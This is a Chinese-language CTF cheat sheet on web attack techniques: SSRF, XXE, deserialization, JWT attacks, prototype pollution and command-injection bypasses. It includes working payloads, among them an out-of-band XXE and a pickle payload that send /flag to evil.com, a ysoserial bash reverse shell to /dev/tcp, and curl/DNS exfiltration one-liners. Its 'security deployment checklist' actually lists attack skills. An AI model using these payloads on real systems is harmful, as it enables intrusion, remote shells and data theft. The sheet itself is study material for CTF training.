# Web CTF 考点速查：SSRF / XXE / 反序列化 / JWT

> **📘 文档定位**：CTF Web 进阶速查 | 难度：⭐⭐⭐⭐ | 预计阅读：25 分钟
> 深入解析 SSRF、XXE、PHP/Java/Python 反序列化、JWT 攻击、原型链污染和命令执行绕过等进阶考点。

---

## 导航目录

- [1. SSRF 深入](#1-ssrf)
- [2. XXE 深入](#2-xxe)
- [3. PHP 反序列化](#3-php-反序列化)
- [4. Python 反序列化 / Pickle](#4-python-反序列化--pickle)
- [5. Java 反序列化](#5-java-反序列化)
- [6. JWT 攻击](#6-jwt-攻击)
- [7. 原型链污染](#7-原型链污染)
- [8. 命令执行与绕过](#8-命令执行与绕过)
- [9. 安全部署 Checklist](#9-安全部署-checklist)
- [10. 高分考点与知识巧记](#10-高分考点与知识巧记)

---

## 1. SSRF

### 1.1 核心原理

服务端发起请求，攻击者可控制目标 URL。常用于：
- 打内网服务（Redis / MySQL / Elasticsearch / HTTP Basic Auth）
- 云平台 Metadata API：`http://169.254.169.254/`（AWS）、`http://metadata.google.internal`
- 文件读取：`file:///etc/passwd`、`php://filter/convert.base64-encode/resource=index.php`
- Gopher 协议：`gopher://127.0.0.1:6379/_...`（打 Redis、打 MySQL、打 FastCGI）

### 1.2 绕过手法大全

```
http://127.0.0.1 → http://2130706433/ (十进制)
http://127.0.0.1 → http://0x7f000001/ (十六进制)
http://0/         # 解析到 0.0.0.0
http://localhost/
http://[::]:22/   # IPv6
http://evil@127.0.0.1/  # userinfo 部分
http://127.0.0.1.xip.io/ → 实际解析为 127.0.0.1
使用 302 跳转：evil.com 返回 302 http://127.0.0.1
DNS rebinding：同一域名短时间内切换到内网 IP
```

### 1.3 常用工具

| 工具 | 用途 |
|:---|:---|
| **Gopherus** | 构造 Redis/MySQL/FastCGI 的 gopher payload |
| **SSRFmap** | 自动化探测 |
| **protocol_dict** | 各种协议（dict:// / gopher:// / ftp:// / file://） |

> **🔑 高分考点**：Gopher 协议是 SSRF 打内网最常用的协议，可构造任意 TCP 数据包。

---

## 2. XXE

### 2.1 基础利用

利用 XML 解析器加载外部实体，导致文件读取 / SSRF / 拒绝服务。

```xml
<!-- 文件读取 -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- PHP 过滤 > " 等字符时使用 base64 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

### 2.2 盲 XXE / OOB 攻击

```xml
<!-- 盲 XXE / OOB 攻击，利用外部 DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>
<foo></foo>

<!-- evil.dtd -->
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://evil.com/?p=%file;'>">
%int;
%send;
```

> **💡 知识巧记**：盲 XXE 的核心思路——无法直接回显时，通过外部 DTD 将文件内容拼到对攻击者服务器的 HTTP 请求中。

---

## 3. PHP 反序列化

### 3.1 魔术方法速查

| 方法 | 触发时机 |
|:---|:---|
| `__construct` | 对象创建时 |
| `__destruct` | 对象销毁时 |
| `__wakeup` | unserialize 时 |
| `__toString` | 对象被当作字符串时 |
| `__get` / `__set` | 访问不存在 / 不可访问属性 |
| `__call` / `__callStatic` | 调用不存在 / 不可访问方法 |
| `__invoke` | 对象被当作函数调用 |
| `__isset` / `__unset` | 对不可访问属性 isset / unset |

### 3.2 POP 链构造思路

从「危险终点」（如 `eval()`、`system()`、`file_put_contents()`）反向追溯到魔术方法，再组合成链。

**常见 POP 链工具**：`phpggc`（PHP Generic Gadget Chains）、`php-serialize`

### 3.3 绕过技巧

- **CVE-2016-7124** `__wakeup` 绕过：对象属性数大于实际数
- `O:4:"User":2:{...}` → 改为 `O:4:"User":3:{...}`
- 引用 `R:2`、protected/private 属性序列化差异
- 原生类利用：`SoapClient` → SSRF（CRLF）

---

## 4. Python 反序列化 / Pickle

```python
import pickle, base64
class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('curl http://evil.com/`cat /flag`',))
payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
```

**常见 sink**：`pickle.loads()`、`yaml.load(..., Loader=Loader)`（PyYAML）、`jsonpickle`、`shelve`、`marshal`

---

## 5. Java 反序列化

### 5.1 核心工具链

- **Gadget**：CommonsCollections 1-7、CommonsBeanutils、Jdk7u21、ROME、Fastjson、Jackson、Hessian、Dubbo、Shiro
- **工具**：`ysoserial`、`marshalsec`、`ysoserial.net`、`Java-Deserialization-Cheat-Sheet`

```bash
java -jar ysoserial.jar CommonsCollections5 "bash -c $'bash -i >& /dev/tcp/x.x.x.x/4444 0>&1'" | base64 -w0
```

### 5.2 常见反序列化入口

| 框架/组件 | 入口类 | 工具 |
|:---|:---|:---|
| Fastjson | `@type` 自动解析 | fastjson-exploit |
| Shiro | RememberMe Cookie | shiro-exploit |
| WebLogic | T3 协议 | weblogic-scan |
| JBoss | JMXInvokerServlet | jexboss |

---

## 6. JWT 攻击

### 6.1 JWT 结构

```
header.payload.signature
header: { "alg": "HS256", "typ": "JWT" }
payload: { "sub": "1", "name": "admin", "iat": ... }
```

### 6.2 攻击手法

1. **alg:none**：去掉签名，服务端若接受 `alg=none` 则可伪造
2. **密钥爆破**：HS256 使用弱密钥，可用 `jwt_tool` + 字典爆破
3. **RS256 → HS256**：用公钥当对称密钥，服务端误把公钥当 HS256 密钥校验
4. **kid 参数注入**：`kid` 指向任意文件，可用 `file://` / SQL 注入 / XXE / LFI
5. **JKU / X5U**：攻击者可控的 JWKS URL
6. **敏感信息泄漏**：payload 仅 base64url，并未加密

**工具**：`jwt_tool`（Python）、`jwt.io`（在线解码）、`john`（JWT brute）、`hashcat -m 16500`

---

## 7. 原型链污染

### 7.1 原理

在 JavaScript 中通过 `merge()`、`cloneDeep()` 等递归复制函数污染 `Object.prototype`：

```javascript
let obj = {};
obj.__proto__.polluted = "yes";
console.log({}.polluted); // "yes"
```

### 7.2 RCE 场景

Node.js + ejs / jade / handlebars / vm.Script + lodash merge / `merge` 函数。

| 场景 | 典型漏洞函数 | 历史 CVE |
|:---|:---|:---|
| 深合并 | `merge` / `deepMerge` / `assignDeep` | lodash `defaultsDeep`（CVE-2019-10744） |
| 深赋值 | `_.set` / `set-value` / `flat` | lodash `set`（CVE-2019-10744） |
| 模板引擎 | `EJS` / `Pug(Jade)` / `Handlebars` | 通过污染模板编译参数 |

---

## 8. 命令执行与绕过

### 8.1 常见绕过技巧

```bash
# 空格、分号、管道符被过滤
cat</etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd';$X

# 关键字被过滤（用字符串拼接、通配符、反引号、$()）
a=c;b=at;$a$b /etc/passwd
/bin/c?/*sswd
echo "Y2F0IC9ldGMvcGFzc3dk"|base64 -d|bash

# 无回显（盲注）
curl http://attacker.com/$(cat /flag|base64 -w0)
ping -c 1 $(cat /flag).attacker.com
```

### 8.2 绕过手法对比

| 过滤项 | 绕过方法 | 示例 |
|:---|:---|:---|
| 空格 | `$IFS`、`<`、`{}` | `cat$IFS/etc/passwd` |
| 关键字 | 拼接、通配符、base64 | `a=c;b=at;$a$b` |
| 斜杠 | 环境变量 | `${PATH:0:1}` |
| 管道符 | 无回显盲注 | curl/dns 外带 |

---

## 安全部署 Checklist

- [ ] SSRF：理解 gopher/file/dict 协议利用，掌握 IP 格式绕过
- [ ] XXE：掌握有回显和无回显（OOB）两种利用方式
- [ ] PHP 反序列化：熟悉魔术方法触发顺序和 POP 链构造
- [ ] Java 反序列化：熟悉 ysoserial 和常见 Gadget Chain
- [ ] JWT：掌握六种攻击手法及对应工具
- [ ] 原型链污染：理解原理，熟悉 EJS/Pug RCE 利用
- [ ] 命令执行：掌握多种绕过技巧和盲注方法

## 高分考点与知识巧记

### 高分考点速查表

| 序号 | 考点 | 频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | SSRF Gopher 协议 | ⭐⭐⭐⭐ | ⭐⭐⭐ | 构造任意 TCP 数据包打内网 |
| 2 | XXE 盲注 OOB | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | 外部 DTD + HTTP 外带 |
| 3 | PHP POP 链构造 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | 入口→跳板→终点三步法 |
| 4 | Java CC 链 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | CommonsCollections 1-7 |
| 5 | JWT 算法混淆 | ⭐⭐⭐ | ⭐⭐⭐ | RS256→HS256 公钥当密钥 |
| 6 | 命令执行绕过 | ⭐⭐⭐⭐ | ⭐⭐ | $IFS/拼接/通配符/base64 |

### 知识巧记口诀

> 🎵 SSRF 打内网用 Gopher，XXE 盲注靠外带。PHP POP 链三步走，Java 反序列 ysoserial 在手。JWT 无签直接改，命令绕过拼接拆分来。

---
